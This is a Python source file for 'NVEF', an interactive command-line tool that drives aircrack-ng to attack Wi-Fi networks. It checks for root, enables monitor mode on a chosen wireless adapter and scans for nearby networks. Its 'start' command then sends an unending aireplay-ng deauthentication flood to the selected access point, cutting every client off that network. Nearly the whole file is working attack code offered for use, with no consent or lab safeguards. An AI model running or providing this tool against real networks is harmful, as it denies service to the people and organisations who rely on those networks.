#MIT License
#
#Copyright (c) 2023 Yzee4
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

import os
import subprocess
import socket
import csv
import sys
import shutil
import time

# Colors
white = '\033[0;97m'
cyan = '\033[0;36m'
lightred = '\033[0;91m'
lightgreen = '\033[0;92m'
yellow = '\033[0;93m'
lightblue = '\033[0;94m'
pink = '\033[0;95m'
lightredn = '\033[1;91m'

# Available commands for use
nvefcommands = ["use deauther", "use beacons", "help", "clear", ""]
deauthercommands = ["options", "scan nadpt", "set nadpt", "scan essid", "set essid", "start",  "help", "clear", ""]

# Check if the user has root permissions
def verify_root():
    if os.geteuid() == 0:
        return True
    else:
        print(f"{lightred}[-] {white}Execute as root!")
        sys.exit()

# Check network connection
def verify_network_connection():
    print(f"{yellow}[/] {white}Checking network connection...")
    try:
        socket.create_connection(("www.google.com", 80), timeout=10)
        return True
    except OSError:
        return False

# Check if aircrack-ng is installed
def check_aircrack():
    print(f"{yellow}[/] {white}Checking if aircrack-ng is installed...")
    return shutil.which("aircrack-ng") is not None

if __name__ == "__main__":
    if verify_root():
        try:
            subprocess.call("clear")
            print(f"{cyan}[!] {white}Checking requirements...")
            time.sleep(1)
            if verify_network_connection():
                time.sleep(1)
                print(f"{lightgreen}[+] {white}Connected to the network.")
                time.sleep(1)
                check_network = "true"
            else:
                time.sleep(1)
                print(f"{lightred}[-] {white}No network connection.")
                check_network = "false"
                time.sleep(1)

            if check_aircrack():
                time.sleep(1)
                aircrackng = "true"
            else:
                time.sleep(1)
                print(f"{lightred}[-] {white}Aircrack-ng is not installed.")
                time.sleep(1)
                print(f"{yellow}[/] {white}Installing aircrack-ng...")
                if check_network == "true":
                    subprocess.call("sudo apt install aircrack-ng -y > /dev/null 2>&1", shell=True)
                else:
                    time.sleep(1)
                    print(f"{lightred}[-] {white}No network connection. Please connect!")
                    check_network = "false"
                    time.sleep(1)
                    sys.exit()
        except KeyboardInterrupt:
            subprocess.run("clear")
            print(f"{lightgreen}[+] {white}System aborted!")
            time.sleep(1)
            sys.exit()

        time.sleep(1)

    # Check again if aircrack-ng is installed
    def check_aircrack():
        return shutil.which("aircrack-ng") is not None

    if check_aircrack():
        print(f"{lightgreen}[+] {white}Aircrack-ng is installed.")
        time.sleep(1)
        subprocess.run("clear")
    else:
        subprocess.run("clear")
        print(f"{lightgreen}[+] {white}System aborted!")
        time.sleep(1)
        sys.exit()

    # Remove CSV files
    directory = os.path.dirname(os.path.abspath(__file__))
    for archive in os.listdir(directory):
        if archive.endswith(".csv"):
            archive_path = os.path.join(directory, archive)
            os.remove(archive_path)

    # Main menu
    subprocess.run(["clear"])
    print(f"""                                                                                                   
{lightred}    ███▄▄▄▄                ▄████████                                                                  
{lightred}    ███▀▀▀██▄  ▄█    █▄    ███    ███    ▄████████                                                    
{lightred}    ███   ███ ███    ███   ███    █▀    ███    ███                                                    
{lightred}    ███   ███ ███    ███  ▄███▄▄▄       ███    █▀                                                     
{lightred}    ███   ███ ███    ███ ▀▀███▀▀▀      ▄███▄▄▄    {white}   Network Vulnerability Explorer Framework.
{lightred}    ███   ███ ███    ███   ███    █▄  ▀▀███▀▀▀    {white}   produced for {lightgreen}enthusiasts {white}:)              
{lightred}    ███   ███ ███    ███   ███    ███   ███                                                           
{lightred}     ▀█   █▀  ███    ███   ██████████   ███                                                           
{lightred}               ▀██████▀                 ███                                                           

   {white}This tool is constantly updated,
   make sure you are using the most current version at {lightgreen}'https://github/com/yzee4/NVEF'{white}.

{white}   |+   NVEF is a network vulnerability exploration tool, it can be combined with other tools for other  
{white}   |+   purposes. If you have any questions, use {lightgreen}'help'{white}.                                    
{white}   |+   Made by: Yzee                                                                                    
{white}   |+   Version: 1.0.1 (en-us)                                                                                   
""")

    try:
        while True:
            console = input(f"{white}nvef {white}> ")

            # Help
            if console == "help":
                print(f"""
{yellow}[/] {white}Help NVEF menu:

{lightgreen}Console commands:                           
{white}use       \t 'use <function>'\t {yellow}use some function
{white}clear     \t                 \t {yellow}clear console
{white}help      \t                 \t {yellow}provides help

{lightgreen}Functions:      
{white}deauther  \t 'use deauhter'  \t {yellow}with deauth attacks

{lightgreen}Deauther console commands:
{white}options   \t {yellow}provides data to be filled in
{white}scan nadpt\t {yellow}scan network cards
{white}set nadpt \t {yellow}set changed network card
{white}scan essid\t {yellow}scan networks to attack
{white}set essid \t {yellow}set changed network to attack
{white}start     \t {yellow}starting attack
{white}clear     \t {yellow}clear console
{white}help      \t {yellow}provides help
""")

            # Set deauth mode
            if console == "use deauther":
                nadpt = "None"
                essid = "None"
                bssid = "None"
                channel = "None"
                vscan_nadpt = "false"
                vscan_essid = "false"
                try:
                    print(f"{lightgreen}[+] {white}Mode: 'deauther' has been set.")
                    print("")

                    while True:
                        global dconsole
                        dconsole = input(f"{white}nvef > {lightredn}deauther {white}> ")

                        # Help
                        if dconsole == "help":
                            print(f"""
{yellow}[/] {white}Help DEAUTHER menu:

{lightgreen}Deauther console commands:
{white}options   \t {yellow}provides data to be filled in
{white}scan nadpt\t {yellow}scan network cards
{white}set nadpt \t {yellow}set changed network card
{white}scan essid\t {yellow}scan networks to attack
{white}set essid \t {yellow}set changed network to attack
{white}start     \t {yellow}starting attack
{white}clear     \t {yellow}clear console
{white}help      \t {yellow}provides help
""")

                        # Clear
                        if dconsole == "clear":
                            subprocess.run(["clear"])
                            print(f"""                                                                                                   
{lightred}    ███▄▄▄▄                ▄████████                                                                  
{lightred}    ███▀▀▀██▄  ▄█    █▄    ███    ███    ▄████████                                                    
{lightred}    ███   ███ ███    ███   ███    █▀    ███    ███                                                    
{lightred}    ███   ███ ███    ███  ▄███▄▄▄       ███    █▀                                                     
{lightred}    ███   ███ ███    ███ ▀▀███▀▀▀      ▄███▄▄▄    {white}   Network Vulnerability Explorer Framework.
{lightred}    ███   ███ ███    ███   ███    █▄  ▀▀███▀▀▀    {white}   produced for {lightgreen}enthusiasts {white}:)              
{lightred}    ███   ███ ███    ███   ███    ███   ███                                                           
{lightred}     ▀█   █▀  ███    ███   ██████████   ███                                                           
{lightred}               ▀██████▀                 ███                                                           

   {white}This tool is constantly updated,
   make sure you are using the most current version at {lightgreen}'https://github/com/yzee4/NVEF'{white}.

{white}   |+   NVEF is a network vulnerability exploration tool, it can be combined with other tools for other  
{white}   |+   purposes. If you have any questions, use {lightgreen}'help'{white}.                                    
{white}   |+   Made by: Yzee                                                                                    
{white}   |+   Version: 1.0.1 (en-us)                                                                                   
""")


                        # Options menu
                        if dconsole == "options":
                            print(f"""{yellow}[/] {white}Options menu for deauther attack:

NADPT: {lightgreen}{nadpt}{white}

ESSID: {lightgreen}{essid}{white}\tCH: {lightgreen}{channel}{white}\tBSSID: {lightgreen}{bssid}{white}

{cyan}[!] {white}To set NADPT, use {lightgreen}'set nadpt <network adapter>'{white}, to set ESSID, use {lightgreen}'set essid <network name>'{white}.
""")

                        # NADPT Scanner
                        if dconsole == "scan nadpt":
                            vscan_nadpt = "true"

                            def network_cards():
                                try:
                                    result = subprocess.check_output(["ifconfig"])
                                    result_str = result.decode("utf-8")
                                    cards = []
                                    lines = result_str.split("\n")
                                    for line in lines:
                                        if "flags" in line:
                                            card_name = line.split(":")[0]
                                            if card_name != "lo" and card_name != "eth0":
                                                cards.append(card_name)
                                    return cards
                                except subprocess.CalledProcessError:
                                    print(f"{lightred}[-] {white}'ifconfig' was not executed.")
                                    print("")

                            def scan_nadpt():
                                cards = network_cards()
                                if not cards:
                                    print(f"{lightred}[-] {white}No network adapters available.")
                                    print("")
                                    return None
                                for card in cards:
                                    print(f"")
                                    print(f"{lightgreen}[+] {white}Available network adapters:")
                                    print(f"{white}NADPT: {card}")
                                    print("")
                                    print(f"{cyan}[!] {white}To set NAPDT, use {lightgreen}'set nadpt'{white}.")
                                    print("")
                            scan_nadpt()

                        # Set NADPT
                        if dconsole == "set nadpt":
                            nadpti = None

                            def set_nadpt():
                                global nadpt
                                if vscan_nadpt == "false":
                                    print(f"{lightred}[-] {white}Scanning has not been executed yet, use {lightgreen}'scan nadpt'{white}.")
                                    print("")
                                elif vscan_nadpt == "true":
                                    cards = network_cards()
                                    while True:
                                        try:
                                            nadpti = input(f"{lightblue}[#] {white}Set NADPT > ")
                                            nadpt = None
                                            if nadpti in cards:
                                                nadpt = nadpti
                                                print(f"{lightgreen}[+] {white}Nadpt set to {lightgreen}'{nadpt}'{white}.")
                                                print("")
                                                break
                                            else:
                                                print(f"{lightred}[-] {yellow}'{nadpti}' {white}Does not correspond to a valid nadpt.")
                                        except KeyboardInterrupt:
                                            print(f"")
                                            print(f"{lightred}[-] {white}Nadpt was not set.")
                                            print("")
                                            break
                            set_nadpt()

                        # ESSID, BSSID, and CHANNEL Scanner
                        if dconsole == "scan essid":
                            if vscan_nadpt == "false":
                                print(f"{lightred}[-] {white}NADPT is not set, use {lightgreen}'set nadpt'{white}.")
                                print("")
                            elif vscan_nadpt == "true":
                                def set_scanning_time():
                                    global scanning_time
                                    global vscan_essid_abort
                                    vscan_essid_abort = "false"
                                    while True:
                                        try:
                                            iscanning_time = input(f"{lightblue}[#] {white}Set scanning time > ")
                                            if iscanning_time.isdigit():
                                                scanning_time = float(iscanning_time)
                                                break
                                            else:
                                                print(f"{lightred}[-] {white}Enter a number!")
                                        except KeyboardInterrupt:
                                            vscan_essid_abort = "true"
                                            break
                                set_scanning_time()

                                if vscan_essid_abort == "true":
                                    print(f"")
                                    print(f"{lightred}[-] {white}ESSID scanning was aborted.")
                                    print("")
                                elif vscan_essid_abort == "false":
                                    def scan_essid():
                                        global networks
                                        global vscan_essid
                                        global network_data
                                        print(f"{lightgreen}[+] {white}Monitoring mode: enabled")
                                        subprocess.run(f"airmon-ng start {nadpt} > /dev/null 2>&1", shell=True)
                                        # Remove CSV files
                                        directory = os.path.dirname(os.path.abspath(__file__))
                                        for archive in os.listdir(directory):
                                            if archive.endswith(".csv"):
                                                archive_path = os.path.join(directory, archive)
                                                os.remove(archive_path)
                                        vscan_essid = "true"
                                        process = subprocess.Popen(f"airodump-ng -w temp --write-interval 1 --output-format csv {nadpt}mon", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        print(f"{lightgreen}[+] {white}Scanning... please wait for {lightgreen}'{scanning_time}' {white}seconds.")
                                        time.sleep(scanning_time)
                                        process.terminate()
                                        vscan_essid = "true"
                                        process
                                        process.wait()
                                        network_data = []
                                        print(f"{lightgreen}[+] {white}Monitoring mode: disabled")
                                        subprocess.run(f"airmon-ng stop {nadpt}mon > /dev/null 2>&1", shell=True)
                                        networks = []
                                        try:
                                            with open("temp-01.csv") as arquivo_csv:
                                                leitor_csv = csv.reader(arquivo_csv)
                                                for line in leitor_csv:
                                                    if len(line) >= 15 and line[0].strip() != 'BSSID':
                                                        bssid = line[0].strip()
                                                        essid = line[13].strip()
                                                        channel = line[3].strip()
                                                        if essid:
                                                            network_data.append((bssid, essid, channel))
                                                            networks.append(essid)
                                        except FileNotFoundError:
                                            print(f"{lightred}[-] {white}File not found.")
                                        if network_data:
                                            print(f"")
                                            print(f"{lightgreen}[+] {white}Available networks:")
                                            for bssid, essid, channel in network_data:
                                                print(f"ESSID: {essid}")
                                            print("")
                                            print(f"{cyan}[!] {white}To set ESSID, use {lightgreen}'set essid'{white}.")
                                            print("")
                                        else:
                                            print(f"{lightred}[-] {white}Networks not found.")
                                    scan_essid()

                        # Set ESSID
                        if dconsole == "set essid":
                            def set_essid():
                                global essid
                                global bssid
                                global channel
                                if vscan_essid == "false":
                                    print(f"{lightred}[-] {white}Scanning has not been executed yet, use {lightgreen}'scan essid'{white}.")
                                    print("")
                                elif vscan_essid == "true":
                                    while True:
                                        try:
                                            iessid = input(f"{lightblue}[#] {white}Set ESSID > ")
                                            if iessid in networks:
                                                for chosen_bssid, chosen_essid, chosen_channel in network_data:
                                                    if chosen_essid == iessid:
                                                        essid = chosen_essid
                                                        channel = chosen_channel
                                                        bssid = chosen_bssid
                                                        print(f"{lightgreen}[+] {white}ESSID set to {lightgreen}'{essid}'{white}.")
                                                        print(f"{lightgreen}[+] {white}CHANNEL set to {lightgreen}'{channel}'{white}.")
                                                        print(f"{lightgreen}[+] {white}BSSID set to {lightgreen}'{bssid}'{white}.")
                                                        print("")
                                                break
                                            else:
                                                print(f"{lightred}[-] {yellow}'{iessid}' {white}Does not correspond to a valid ESSID.")
                                        except KeyboardInterrupt:
                                            print(f"")
                                            print(f"{lightred}[-] {white}ESSID was not set.")
                                            print("")
                                            break
                            set_essid()

                        if dconsole == "start":
                            def start_attack():
                                global nadpt
                                global essid
                                global channel
                                global bssid
                                if vscan_essid == "false":
                                    print(f"{lightred}[-] {white}NADPT is not set, use {lightgreen}'set essid'{white}.")
                                    print("")
                                elif vscan_essid == "true":
                                    try:
                                        print(f"{lightgreen}[+] {white}Starting attack on {lightgreen}'{essid}'{white}...")
                                        print(f"{pink}[N] {white}Attack started. Ctrl+C to stop")
                                        subprocess.run(f"airmon-ng start {nadpt} {channel} > /dev/null 2>&1", shell=True)
                                        subprocess.run(f"airmon-ng start {nadpt}mon {channel} > /dev/null 2>&1", shell=True)
                                        subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} {nadpt}mon > /dev/null 2>&1", shell=True)
                                    except KeyboardInterrupt:
                                        print(f"")
                                        print(f"{lightgreen}[+] {white}Attack stopped! Please wait a moment.")
                                        print(f"")
                                        subprocess.run(f"airmon-ng stop {nadpt}mon > /dev/null 2>&1", shell=True)
                            start_attack()

                        if not dconsole in deauthercommands:
                            print(f"{lightred}[-] {white}Unknown command: {dconsole}.")
                            print("")

                except KeyboardInterrupt:
                    console = ""
                    print("")
                    print(f"{lightgreen}[+] {white}Exiting deauther mode.")
                    print("")
                    subprocess.run("clear")
                    print(f"""                                                                                                   
{lightred}    ███▄▄▄▄                ▄████████                                                                  
{lightred}    ███▀▀▀██▄  ▄█    █▄    ███    ███    ▄████████                                                    
{lightred}    ███   ███ ███    ███   ███    █▀    ███    ███                                                    
{lightred}    ███   ███ ███    ███  ▄███▄▄▄       ███    █▀                                                     
{lightred}    ███   ███ ███    ███ ▀▀███▀▀▀      ▄███▄▄▄    {white}   Network Vulnerability Explorer Framework.
{lightred}    ███   ███ ███    ███   ███    █▄  ▀▀███▀▀▀    {white}   produced for {lightgreen}enthusiasts {white}:)              
{lightred}    ███   ███ ███    ███   ███    ███   ███                                                           
{lightred}     ▀█   █▀  ███    ███   ██████████   ███                                                           
{lightred}               ▀██████▀                 ███                                                           

   {white}This tool is constantly updated,
   make sure you are using the most current version at {lightgreen}'https://github/com/yzee4/NVEF'{white}.

{white}   |+   NVEF is a network vulnerability exploration tool, it can be combined with other tools for other  
{white}   |+   purposes. If you have any questions, use {lightgreen}'help'{white}.                                    
{white}   |+   Made by: Yzee                                                                                    
{white}   |+   Version: 1.0.1 (en-us)                                                                                   
""")

                    
            # Clear
            if console == "clear":
                subprocess.run(["clear"])
                print(f"""                                                                                                   
{lightred}    ███▄▄▄▄                ▄████████                                                                  
{lightred}    ███▀▀▀██▄  ▄█    █▄    ███    ███    ▄████████                                                    
{lightred}    ███   ███ ███    ███   ███    █▀    ███    ███                                                    
{lightred}    ███   ███ ███    ███  ▄███▄▄▄       ███    █▀                                                     
{lightred}    ███   ███ ███    ███ ▀▀███▀▀▀      ▄███▄▄▄    {white}   Network Vulnerability Explorer Framework.
{lightred}    ███   ███ ███    ███   ███    █▄  ▀▀███▀▀▀    {white}   produced for {lightgreen}enthusiasts {white}:)              
{lightred}    ███   ███ ███    ███   ███    ███   ███                                                           
{lightred}     ▀█   █▀  ███    ███   ██████████   ███                                                           
{lightred}               ▀██████▀                 ███                                                           

   {white}This tool is constantly updated,
   make sure you are using the most current version at {lightgreen}'https://github/com/yzee4/NVEF'{white}.

{white}   |+   NVEF is a network vulnerability exploration tool, it can be combined with other tools for other  
{white}   |+   purposes. If you have any questions, use {lightgreen}'help'{white}.                                    
{white}   |+   Made by: Yzee                                                                                    
{white}   |+   Version: 1.0.1 (en-us)                                                                                   
""")

            if not console in nvefcommands:
                print(f"{lightred}[-] {white}Unknown command: {console}.")
                print("")                  

    except KeyboardInterrupt:
        print("")
        print(f"{yellow}[/] {white}Thank you for using :)")
        time.sleep(1)
        subprocess.run("clear")
        sys.exit()

